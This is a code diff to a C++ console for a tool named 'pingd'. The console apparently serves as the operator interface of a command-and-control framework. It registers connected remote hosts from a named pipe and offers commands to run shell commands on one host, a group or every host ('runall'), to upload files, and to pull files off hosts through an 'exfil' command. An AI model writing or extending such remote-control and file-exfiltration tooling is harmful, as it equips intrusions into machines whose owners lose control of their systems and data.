@@ -5,8 +5,10 @@
 #include <functional>
 #include <sstream>
 #include <algorithm>
+#include <thread>
 #include <mutex>
 #include <fstream>
+#include <filesystem>
 
 #include <readline/history.h>
 #include <readline/readline.h>
@@ -24,10 +26,7 @@ using host_mapping_t = std::map<std::string, std::string>;
 using group_t = std::map<std::string, std::vector<std::string>>;
 
 /** Currently connected hosts */
-static host_mapping_t active_connections = {
-  { "localhost", "127.0.0.1" },
-  { "pingd", "127.0.0.2" }
-};
+static host_mapping_t active_connections;
 static std::mutex active_connections_mutex;
 
 /** Groups */
@@ -38,6 +37,9 @@ static std::string cur_host;
 
 /** Currently selected group */
 static std::string cur_group;
+
+static const std::string command_pipe = "/tmp/pingd_command";
+static const std::string host_info_pipe = "/tmp/pingd_host_info";
 
 void cmd_help(const std::string &);
 void cmd_list(const std::string &);
@@ -72,11 +74,26 @@ static const std::map<std::string, command_t> commands = {
   { "exit", { cmd_exit, "exit: stops the server and exits" } },
 };
 
-void send_pipe(const std::string &cmd)
+void active_connections_task()
 {
-  int fd = open("/tmp/pingd", O_WRONLY);
-  write(fd, cmd.c_str(), cmd.size() + 1);
-  close(fd);
+  int pipefd;
+  if ((pipefd = open(host_info_pipe.c_str(), O_RDWR)) == -1) {
+    perror("open()");
+    std::exit(-1);
+  }
+
+  while (1) {
+    uint8_t buf[1024];
+    size_t nbytes;
+    if ((nbytes = read(pipefd, buf, 1024)) == -1) {
+      perror("read()");
+    }
+
+    std::string host{ (char *)buf, nbytes };
+    std::string ip = host.substr(host.find('@') + 1, host.size());
+    std::lock_guard<std::mutex> guard(active_connections_mutex);
+    active_connections[host] = ip;
+  }
 }
 
 std::vector<std::string> split_input(const std::string &input)
@@ -194,6 +211,7 @@ void cmd_set(const std::string &input)
     std::puts("usage: set [host]");
     return;
   }
+
   if (active_connections.find(input_arr.at(1)) != active_connections.end()) {
     cur_host = input_arr.at(1);
     cur_group.clear();
@@ -222,13 +240,28 @@ void cmd_run(const std::string &input)
     }
   }
 
+  int pipefd;
+  if ((pipefd = open(command_pipe.c_str(), O_WRONLY)) == -1) {
+    perror("open()");
+    return;
+  }
+
   if (!cur_host.empty()) {
     std::string ip = active_connections[cur_host];
     std::cout << "Running command \"" << command << "\" on "
               << ip
               << "\n";
 
-    send_pipe("send_command " + ip + " " + command);
+    std::stringstream sstream;
+    sstream << "send_command "
+            << ip
+            << " "
+            << command;
+
+    long nbytes;
+    if ((nbytes = write(pipefd, sstream.str().c_str(), sstream.str().size() + 1)) == -1) {
+      perror("write()");
+    }
   } else if (!cur_group.empty()) {
     auto &group = groups.at(cur_group);
     for (auto &host : group) {
@@ -239,11 +272,22 @@ void cmd_run(const std::string &input)
       std::cout << "Running command \"" << command << "\" on "
                 << ip
                 << "\n";
-      send_pipe("send_command " + ip + " " + command);
+
+      std::stringstream sstream;
+      sstream << "send_command "
+              << ip
+              << " "
+              << command;
+
+      long nbytes;
+      if ((nbytes = write(pipefd, sstream.str().c_str(), sstream.str().size() + 1)) == -1) {
+        perror("write()");
+      }
     }
   } else {
     std::puts("no group or host selected!");
   }
+  close(pipefd);
 }
 
 void cmd_file(const std::string &input)
@@ -255,12 +299,32 @@ void cmd_file(const std::string &input)
     return;
   }
 
+  int pipefd;
+  if ((pipefd = open(command_pipe.c_str(), O_WRONLY)) == -1) {
+    perror("open()");
+    return;
+  }
+
   if (!cur_host.empty()) {
     std::string ip = active_connections[cur_host];
     std::cout << "Sending file: " << input_arr.at(1) << " to: " << input_arr.at(2) << " on: "
               << ip
               << "\n";
-    send_pipe("send_file " + ip + " " + input_arr.at(1) + " " + input_arr.at(2));
+
+    std::filesystem::path p = input_arr.at(1);
+
+    std::stringstream sstream;
+    sstream << "send_file "
+            << ip
+            << " "
+            << std::filesystem::absolute(p)
+            << " "
+            << input_arr.at(2);
+
+    long nbytes;
+    if ((nbytes = write(pipefd, sstream.str().c_str(), sstream.str().size() + 1)) == -1) {
+      perror("write()");
+    }
   } else if (!cur_group.empty()) {
     auto &group = groups.at(cur_group);
     for (auto &host : group) {
@@ -271,11 +335,26 @@ void cmd_file(const std::string &input)
       std::cout << "Sending file: " << input_arr.at(1) << " to: " << input_arr.at(2) << " on: "
                 << ip
                 << "\n";
-      send_pipe("send_file " + ip + " " + input_arr.at(1) + " " + input_arr.at(2));
+
+      std::filesystem::path p = input_arr.at(1);
+
+      std::stringstream sstream;
+      sstream << "send_file "
+              << ip
+              << " "
+              << std::filesystem::absolute(p)
+              << " "
+              << input_arr.at(2);
+
+      long nbytes;
+      if ((nbytes = write(pipefd, sstream.str().c_str(), sstream.str().size() + 1)) == -1) {
+        perror("write()");
+      }
     }
   } else {
     std::puts("no group or host selected!");
   }
+  close(pipefd);
 }
 
 void cmd_exfil(const std::string &input)
@@ -292,12 +371,34 @@ void cmd_exfil(const std::string &input)
     return;
   }
 
+  int pipefd;
+  if ((pipefd = open(command_pipe.c_str(), O_WRONLY)) == -1) {
+    perror("open()");
+    return;
+  }
+
   std::string ip = active_connections[cur_host];
 
   std::cout << "Receiving file: " << input_arr.at(1) << " to: " << input_arr.at(2) << " on: "
             << ip
             << "\n";
-  send_pipe("receive_file " + ip + " " + input_arr.at(1) + " " + input_arr.at(2));
+
+  std::filesystem::path p = input_arr.at(2);
+
+  std::stringstream sstream;
+  sstream << "receive_file "
+          << ip
+          << " "
+          << input_arr.at(1)
+          << " "
+          << std::filesystem::absolute(p);
+
+  long nbytes;
+  if ((nbytes = write(pipefd, sstream.str().c_str(), sstream.str().size() + 1)) == -1) {
+    perror("write()");
+  }
+
+  close(pipefd);
 }
 
 void cmd_runall(const std::string &input)
@@ -306,6 +407,12 @@ void cmd_runall(const std::string &input)
 
   if (input_arr.size() < 2) {
     std::puts("usage: runall [command]");
+    return;
+  }
+
+  int pipefd;
+  if ((pipefd = open(command_pipe.c_str(), O_WRONLY)) == -1) {
+    perror("open()");
     return;
   }
 
@@ -320,11 +427,18 @@ void cmd_runall(const std::string &input)
   std::lock_guard<std::mutex> guard(active_connections_mutex);
   auto it = active_connections.begin();
   for (; it != active_connections.end(); it++) {
-    std::cout << "Running command \"" << command << "\" on "
-              << it->second
-              << "\n";
-    send_pipe("send_command " + it->second + " " + command);
+    std::stringstream sstream;
+    sstream << "send_command "
+            << it->second
+            << " "
+            << command;
+
+    long nbytes;
+    if ((nbytes = write(pipefd, sstream.str().c_str(), sstream.str().size() + 1)) == -1) {
+      perror("write()");
+    }
   }
+  close(pipefd);
 }
 
 void cmd_clear(const std::string &)
@@ -385,6 +499,9 @@ char **command_completion(const char *text, int start, int end)
 
 int main(int argc, char **argv)
 {
+  std::thread active_connections_thread(active_connections_task);
+  active_connections_thread.detach();
+
   cmd_help("help");
 
   rl_attempted_completion_function = command_completion;
